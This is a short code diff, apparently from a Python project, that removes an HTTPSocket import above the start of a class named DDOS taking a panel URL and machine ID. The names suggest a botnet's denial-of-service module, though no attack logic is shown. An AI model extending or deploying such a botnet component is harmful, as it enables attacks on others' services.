@@ -1,5 +1,3 @@
-from HTTPSocket import HTTPSocket
-
 class DDOS:
     def __init__(self, panelURL, machineID):
         self.panelURL = panelURL
